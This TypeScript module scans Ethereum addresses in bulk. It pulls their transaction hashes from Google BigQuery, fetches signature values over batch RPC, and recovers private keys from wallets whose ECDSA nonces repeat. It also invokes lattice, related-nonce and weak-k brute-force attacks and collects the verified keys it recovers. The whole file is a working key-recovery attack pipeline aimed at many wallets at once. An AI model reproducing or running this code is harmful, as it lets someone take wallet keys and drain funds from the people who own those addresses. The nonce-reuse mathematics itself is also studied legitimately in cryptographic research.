/**
 * BigQuery Bulk R-Value Scanner
 * ══════════════════════════════
 * Uses Google BigQuery's public Ethereum dataset to fetch ALL transaction
 * hashes for target addresses in a single SQL query — no pagination, no
 * rate limits, no per-address API calls.
 *
 * bigquery-public-data.crypto_ethereum.transactions
 *   → hash, from_address, nonce, block_number, transaction_index
 *
 * Then batch JSON-RPC (50 txs per request) pulls r, s, v from publicnode.
 *
 * Pipeline:
 *   addresses[] → BigQuery SQL → tx hashes[] → batch RPC → {r,s,v,z}[]
 *                                                          → group by r
 *                                                          → key decoder
 */

import { BigQuery } from "@google-cloud/bigquery";
import { ethers }   from "ethers";
import { logger }   from "../logger";
import {
  TxSignatureData,
  WalletScanResult,
  recoverPrivateKey,
  NonceReusePair,
} from "./nonce-recovery";
import { resolveEnsNames } from "./ens-resolver";
import {
  detectCrossAddressRCollisions,
  detectExactDuplicates,
  relatedNonceAttack,
  analyzeSignatureBias,
  latticeAttack,
  weakKBruteForce,
  type AdvancedFinding,
} from "./advanced-attacks";

// ── RPC endpoint ──────────────────────────────────────────────────────────────
const RPC_URL = "https://ethereum.publicnode.com";

// ── BigQuery client (lazy-initialised from env) ───────────────────────────────
let _bq: BigQuery | null = null;

function getBigQuery(): BigQuery {
  if (_bq) return _bq;

  const raw = process.env.GOOGLE_BIGQUERY_KEY;
  if (!raw) throw new Error("GOOGLE_BIGQUERY_KEY secret is not set");

  let credentials: Record<string, unknown>;
  try {
    credentials = JSON.parse(raw);
  } catch {
    throw new Error("GOOGLE_BIGQUERY_KEY is not valid JSON — paste the full service-account key file content");
  }

  _bq = new BigQuery({
    projectId:   (credentials.project_id as string) ?? "proxhq-scanner",
    credentials: credentials as Parameters<typeof BigQuery>[0]["credentials"],
  });

  return _bq;
}

export function isBigQueryConfigured(): boolean {
  return !!process.env.GOOGLE_BIGQUERY_KEY;
}

// ── Step 1: bulk tx-hash lookup via BigQuery ──────────────────────────────────
export async function fetchTxHashesBigQuery(
  addresses: string[],
): Promise<Map<string, string[]>> {
  const bq      = getBigQuery();
  const addrMap = new Map<string, string[]>();

  // Normalise to lowercase for BigQuery (dataset stores lowercase)
  const lower = addresses.map(a => a.toLowerCase());

  // Chunk to stay under BigQuery IN-list limits (~1000 addresses per batch)
  const CHUNK = 1_000;
  for (let i = 0; i < lower.length; i += CHUNK) {
    const batch = lower.slice(i, i + CHUNK);

    // Build inline value list to avoid parameterized ARRAY type issues
    const inList = batch.map(a => `'${a.replace(/'/g, "''")}'`).join(",");
    const query = `
      SELECT
        from_address,
        \`hash\`
      FROM \`bigquery-public-data.crypto_ethereum.transactions\`
      WHERE from_address IN (${inList})
      ORDER BY from_address, block_number, transaction_index
    `;

    logger.info({ batchSize: batch.length, offset: i }, "BigQuery: fetching tx hashes for address batch");

    const [rows] = await bq.query({
      query,
      location:     "US",
      useLegacySql: false,
    });

    for (const row of rows as Array<{ from_address: string; hash: string }>) {
      const addr = row.from_address.toLowerCase();
      const arr  = addrMap.get(addr) ?? [];
      arr.push(row.hash);
      addrMap.set(addr, arr);
    }

    logger.info({ totalRows: rows.length, distinctAddrs: addrMap.size }, "BigQuery batch complete");
  }

  return addrMap;
}

// ── Step 2: batch JSON-RPC — 50 tx per HTTP request ──────────────────────────
interface RawRpcTx {
  hash:                 string;
  from:                 string;
  to:                   string | null;
  nonce:                string;   // hex
  value:                string;   // hex
  gasPrice:             string | null;
  maxFeePerGas:         string | null;
  maxPriorityFeePerGas: string | null;
  gas:                  string;   // hex = gasLimit
  input:                string;
  type:                 string;   // hex "0x0" "0x1" "0x2"
  chainId:              string | null;
  accessList:           unknown[] | null;
  blockNumber:          string;   // hex
  v:                    string;   // hex
  r:                    string;   // 0x + 64 hex chars
  s:                    string;
}

async function batchRpcGetTxs(hashes: string[]): Promise<(RawRpcTx | null)[]> {
  const BATCH       = 50;   // txs per JSON-RPC batch request
  const CONCURRENCY = 12;   // parallel in-flight HTTP requests
  const out: (RawRpcTx | null)[] = new Array(hashes.length).fill(null);

  // Build all batch descriptors
  const batches: Array<{ start: number; slice: string[] }> = [];
  for (let i = 0; i < hashes.length; i += BATCH) {
    batches.push({ start: i, slice: hashes.slice(i, i + BATCH) });
  }

  // Process with bounded concurrency
  async function doOne(b: { start: number; slice: string[] }): Promise<void> {
    const payload = b.slice.map((h, idx) => ({
      jsonrpc: "2.0",
      method:  "eth_getTransactionByHash",
      params:  [h],
      id:      b.start + idx,
    }));
    try {
      const res  = await fetch(RPC_URL, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify(payload),
        signal:  AbortSignal.timeout(30_000),
      });
      const data = await res.json() as Array<{ id: number; result: RawRpcTx | null }>;
      for (const item of data) {
        const localIdx = item.id - b.start;
        if (localIdx >= 0 && localIdx < b.slice.length) {
          out[b.start + localIdx] = item.result ?? null;
        }
      }
    } catch (err) {
      logger.warn({ err, batchStart: b.start }, "Batch RPC error — continuing");
    }
  }

  // Sliding-window concurrency
  let idx = 0;
  const active = new Set<Promise<void>>();
  while (idx < batches.length || active.size > 0) {
    while (active.size < CONCURRENCY && idx < batches.length) {
      const p = doOne(batches[idx++]).then(() => active.delete(p));
      active.add(p);
    }
    if (active.size > 0) await Promise.race(active);
  }

  return out;
}

// ── Reconstruct the signed message hash (z) from raw RPC fields ───────────────
function reconstructZ(tx: RawRpcTx): string {
  try {
    const txType = parseInt(tx.type ?? "0x0", 16);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const fields: Record<string, any> = {
      to:       tx.to,
      nonce:    parseInt(tx.nonce, 16),
      gasLimit: BigInt(tx.gas),
      data:     tx.input,
      value:    BigInt(tx.value),
      type:     txType,
    };

    if (txType === 2) {
      fields.chainId              = BigInt(tx.chainId ?? "0x1");
      fields.maxFeePerGas         = BigInt(tx.maxFeePerGas ?? "0x0");
      fields.maxPriorityFeePerGas = BigInt(tx.maxPriorityFeePerGas ?? "0x0");
      fields.accessList           = tx.accessList ?? [];
    } else if (txType === 1) {
      fields.chainId    = BigInt(tx.chainId ?? "0x1");
      fields.gasPrice   = BigInt(tx.gasPrice ?? "0x0");
      fields.accessList = tx.accessList ?? [];
    } else {
      fields.gasPrice = BigInt(tx.gasPrice ?? "0x0");
      const chainId = tx.chainId ? BigInt(tx.chainId) : null;
      if (chainId && chainId > 0n) fields.chainId = chainId;
    }

    const unsigned = ethers.Transaction.from(fields);
    return ethers.keccak256(unsigned.unsignedSerialized);
  } catch {
    return "0x" + "0".repeat(64);
  }
}

// ── Step 3: convert raw RPC tx to TxSignatureData ────────────────────────────
function toSignatureData(tx: RawRpcTx): TxSignatureData | null {
  if (!tx?.r || tx.r === "0x" || tx.r === "0x0") return null;

  const z = reconstructZ(tx);
  return {
    txHash:      tx.hash,
    blockNumber: parseInt(tx.blockNumber ?? "0x0", 16),
    from:        tx.from ?? "",
    to:          tx.to ?? null,
    value:       ethers.formatEther(BigInt(tx.value)),
    r:           tx.r,
    s:           tx.s,
    v:           parseInt(tx.v, 16),
    z,
    nonce:       parseInt(tx.nonce, 16),
    gasPrice:    BigInt(tx.gasPrice ?? tx.maxFeePerGas ?? "0x0").toString(),
  };
}

// ── Step 4: nonce-reuse detection (mirrors nonce-recovery.ts buildResult) ─────
const CURVE_N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

function modN(x: bigint): bigint {
  return ((x % CURVE_N) + CURVE_N) % CURVE_N;
}
function modInverse(a: bigint, m: bigint): bigint {
  let [oldR, r] = [((a % m) + m) % m, m];
  let [oldS, s] = [1n, 0n];
  while (r !== 0n) {
    const q = oldR / r;
    [oldR, r] = [r, oldR - q * r];
    [oldS, s] = [s, oldS - q * s];
  }
  return ((oldS % m) + m) % m;
}

function detectNonceReuse(
  address:    string,
  signatures: TxSignatureData[],
): NonceReusePair[] {
  const rGroups: Record<string, TxSignatureData[]> = {};
  for (const sig of signatures) {
    const key = sig.r.toLowerCase();
    (rGroups[key] ??= []).push(sig);
  }

  const pairs: NonceReusePair[] = [];
  for (const [r, group] of Object.entries(rGroups)) {
    if (group.length < 2) continue;

    logger.warn(
      { address, sharedR: r.slice(0, 14) + "...", txCount: group.length },
      "⚠️  DUPLICATE SIGNATURE — shared r detected via BigQuery scan — running decoder",
    );

    for (let i = 0; i < group.length; i++) {
      for (let j = i + 1; j < group.length; j++) {
        const t1 = group[i], t2 = group[j];
        const recovery = recoverPrivateKey({ r: t1.r, s1: t1.s, s2: t2.s, z1: t1.z, z2: t2.z, address });

        logger.warn({
          address,
          tx1: t1.txHash,
          tx2: t2.txHash,
          success: recovery.success,
          addressMatches: recovery.addressMatches,
          privateKey: recovery.privateKey ? recovery.privateKey.slice(0, 10) + "..." : null,
        }, recovery.success && recovery.addressMatches
          ? "🔓 KEY DECODER SUCCESS"
          : "✗ decoder: " + recovery.error);

        pairs.push({ sharedR: r, tx1: t1, tx2: t2, riskLevel: "confirmed_reuse", recovery });
      }
    }
  }
  return pairs;
}

// ── Main: scan many addresses at once via BigQuery ────────────────────────────
export async function bulkScanViaBigQuery(
  addresses: string[],
  onProgress?: (done: number, total: number) => void,
): Promise<WalletScanResult[]> {
  if (!isBigQueryConfigured()) {
    throw new Error("GOOGLE_BIGQUERY_KEY not configured — set it in secrets");
  }

  // 1. Get all tx hashes for all addresses in one query
  logger.info({ addressCount: addresses.length }, "BigQuery bulk scan starting");
  const txMap = await fetchTxHashesBigQuery(addresses);
  logger.info({ addressesWithTxs: txMap.size }, "BigQuery tx lookup complete");

  // 2. Collect all unique tx hashes across all addresses
  const allHashes   = [...new Set([...txMap.values()].flat())];
  logger.info({ totalTxHashes: allHashes.length }, "Fetching signatures via batch RPC");

  // 3. Batch RPC — 50 per request
  const rawTxs = await batchRpcGetTxs(allHashes);

  // 4. Build hash → signature map
  const sigByHash = new Map<string, TxSignatureData>();
  for (const raw of rawTxs) {
    if (!raw) continue;
    const sig = toSignatureData(raw);
    if (sig) sigByHash.set(raw.hash.toLowerCase(), sig);
  }
  logger.info({ sigsExtracted: sigByHash.size, total: allHashes.length }, "Batch RPC complete");

  // 5. ENS resolution — resolve primary names for all addresses + their counterparties
  const allInteractionAddrs: string[] = [];
  for (const sig of sigByHash.values()) {
    if (sig.to) allInteractionAddrs.push(sig.to.toLowerCase());
  }
  const ensTargets = [
    ...addresses.map(a => a.toLowerCase()),
    ...allInteractionAddrs,
  ];
  logger.info({ addresses: addresses.length, interactions: allInteractionAddrs.length },
    "ENS: starting batch resolution for scan addresses + interaction counterparties");

  const ensMap = await resolveEnsNames(ensTargets).catch(err => {
    logger.warn({ err }, "ENS resolution failed — continuing without names");
    return new Map<string, string | null>();
  });

  const ensHits = [...ensMap.values()].filter(Boolean).length;
  logger.info({ resolved: ensMap.size, withName: ensHits }, "ENS resolution complete");

  // 6. Per-address: collect sigs, detect nonce reuse + advanced attacks
  const results: WalletScanResult[] = [];
  const sigsByAddress = new Map<string, TxSignatureData[]>();
  let done = 0;

  for (const address of addresses) {
    const lc      = address.toLowerCase();
    const hashes  = txMap.get(lc) ?? [];
    const sigs    = hashes.map(h => sigByHash.get(h.toLowerCase())).filter(Boolean) as TxSignatureData[];
    const pairs   = detectNonceReuse(lc, sigs);

    if (sigs.length > 0) sigsByAddress.set(lc, sigs);

    // Per-address advanced attacks
    const adv: AdvancedFinding[] = [];
    if (sigs.length > 0) {
      adv.push(...detectExactDuplicates(new Map([[lc, sigs]])));
      adv.push(...relatedNonceAttack(lc, sigs));
      const bias = analyzeSignatureBias(lc, sigs);
      adv.push(...bias.findings);
      if (bias.shouldTriggerLattice) adv.push(...latticeAttack(lc, sigs, bias));
      if (bias.smallRCount > 0 || sigs.length <= 200) adv.push(...weakKBruteForce(lc, sigs));
    }

    const recoveredKeys = [...new Set(adv.filter(f => f.privateKey && f.verified).map(f => f.privateKey!))];

    // Build interactionEns: toAddress → ensName for this wallet's sigs
    const interactionEns: Record<string, string> = {};
    for (const sig of sigs) {
      if (sig.to) {
        const name = ensMap.get(sig.to.toLowerCase());
        if (name) interactionEns[sig.to.toLowerCase()] = name;
      }
    }

    results.push({
      address:             address,
      ensName:             ensMap.get(lc) ?? null,
      chain:               "ethereum",
      totalTransactions:   hashes.length,
      signaturesExtracted: sigs.length,
      nonceReusePairs:     pairs,
      hasVulnerability:    pairs.length > 0 || recoveredKeys.length > 0,
      allSignatures:       sigs,
      scanTimestamp:       new Date().toISOString(),
      rPairs:              Object.fromEntries(
        pairs.map(p => [p.sharedR, [p.tx1.txHash, p.tx2.txHash]])
      ),
      advancedFindings: adv,
      recoveredKeys,
      interactionEns:  Object.keys(interactionEns).length > 0 ? interactionEns : undefined,
    });

    onProgress?.(++done, addresses.length);
  }

  // 6. CROSS-ADDRESS r COLLISION SCAN — runs across all collected signatures
  if (sigsByAddress.size > 1) {
    logger.info({ addressCount: sigsByAddress.size, totalSigs: [...sigsByAddress.values()].reduce((s, v) => s + v.length, 0) },
      "Running cross-address r collision scan…");
    const crossFindings = detectCrossAddressRCollisions(sigsByAddress);
    if (crossFindings.length > 0) {
      logger.warn({ count: crossFindings.length }, "⚠️  Cross-address r collisions detected");
      // Attach findings to the affected addresses
      for (const f of crossFindings) {
        const r = results.find(res => res.address.toLowerCase() === f.address.toLowerCase());
        if (r) {
          (r.advancedFindings ??= []).push(f);
          if (f.privateKey && f.verified) (r.recoveredKeys ??= []).push(f.privateKey);
        }
      }
    } else {
      logger.info("Cross-address scan: no r collisions across different addresses");
    }
  }

  return results;
}
